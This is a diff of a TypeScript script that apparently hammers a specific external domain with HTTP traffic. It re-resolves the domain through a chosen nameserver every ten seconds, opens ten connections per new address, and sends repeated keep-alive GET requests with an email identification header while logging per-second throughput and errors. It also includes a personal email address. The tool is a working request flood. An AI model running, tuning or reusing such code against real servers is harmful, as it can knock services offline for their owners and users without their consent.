@@ -17,20 +17,30 @@ class Target {
 }
 
 let queue = new Set<Target>();
+let ardessesSet = new Set<string>();
 
 console.log('hello');
 // for (let i = 0; i < 10; i++) {
 //     queue.add(new Target("127.0.0.1", 8557));
 // }
-dig(['rshb-in.tech', '+short'])
+
+doDig();
+
+setInterval(()=>{
+    doDig();
+}, 10000)
+
+function doDig() {
+    dig(['@ns4.selectel.org', 'rshb-in.tech', '+short'])
     .then((result: any) => {
         let adresses = result.split('\n');
         for (let addr of adresses) {
-            console.log(addr);
-        }
-        for (let addr of adresses) {
-            for (let i = 0; i < 10; i++) {
-                queue.add(new Target(addr, 80));
+            if (!ardessesSet.has(addr)) {
+                console.log(addr);
+                ardessesSet.add(addr);
+                for (let i = 0; i < 10; i++) {
+                    queue.add(new Target(addr, 80));
+                }
             }
         }
         
@@ -39,61 +49,21 @@ dig(['rshb-in.tech', '+short'])
     .catch((err: any) => {
         console.log('Error:', err);
     });
-
-let counter = 0;
-let responceTimes = 0;
-let inProgress = 0;
-function run1 (ip:string) {
-    let start = performance.now();
-    inProgress++;
-    const options = {
-        setHost: false,
-        host: ip,
-        port: 80,
-        path: '/',
-        method: 'GET',
-        headers: {
-            'Host': 'rshb-in.tech',
-            'X-Email-Id': 'busyrev@gmail.com',
-        },
-      };
-      
-      const req = http.request(options, res => {
-        counter++;
-        let end = performance.now();
-        // console.log(end - start);
-        responceTimes += end - start;
-        run1(ip);
-        res.on('data', d => {});
-        res.on('end', () => {
-            inProgress--;
-        });
-      });
-      req.on('error', error => {
-        console.error(error);
-      });
-      req.end();
 }
 
-// let text = "GET / HTTP/1.1\r\n"
-// + "Host: rshb-in.tech\r\n"
-// + "User-Agent: mike\r\n"
-// + "X-Email-Id: busyrev@gmail.com\r\n"
-// + "Accept-Encoding: gzip, deflate\r\n"
-// + "Connection: Keep-Alive\r\n\r\n"
 
-let text = "GET /get HTTP/1.1\r\n"
-// + "Host: rshb-in.tech\r\n"
-// + "User-Agent: mike\r\n"
-+ "X-Email-Id: busyrev@gmail.com\r\n"
-// + "Accept-Encoding: gzip, deflate\r\n"
-+ "Connection: Keep-Alive\r\n\r\n"
-
+let counter = 0;
+let inProgress = 0;
 let closes = 0;
 let drains = 0;
 let errors = 0;
 let totalRequestsMade = 0;
 let totalRequestsConfirmed = 0;
+
+let text = "GET /get HTTP/1.1\r\n"
+// + "Accept-Encoding: br, gzip, deflate\r\n"
++ "X-Email-Id: busyrev@gmail.com\r\n\r\n"
+
 
 setInterval(()=>{
     let targets = [];
@@ -169,15 +139,13 @@ function fuckClient(target:Target) {
 
 
 setInterval(()=>{
-    let avgReqTime = responceTimes / counter;
     let mem = process.memoryUsage();
-    console.log('ops: ' + counter + ', avg time ms: ' + Math.round(avgReqTime) + ', inProgress: ' + inProgress, ', rss: ' + Math.round(mem.rss/(1024*1024)) + 'mb');
-    console.log('closes: ' + closes + ', drains: ' + drains + ', errors: ' + errors, ' totalRequestsMade: ' + totalRequestsMade + ' totalRequestsConfirmed: ' + totalRequestsConfirmed);
+    console.log('ops: ' + counter + ', inProgress: ' + inProgress, ', rss: ' + Math.round(mem.rss/(1024*1024)) + 'mb');
+    console.log('closes: ' + closes + ', drains: ' + drains + ', errors: ' + errors, ' totalRequestsMade: ' + totalRequestsMade + ' totalRequestsConfirmed: ' + totalRequestsConfirmed + ' pid: ' + process.pid);
     closes = 0;
     drains = 0;
     errors = 0;
     counter = 0;
-    responceTimes = 0;
 }, 1000);
     
     
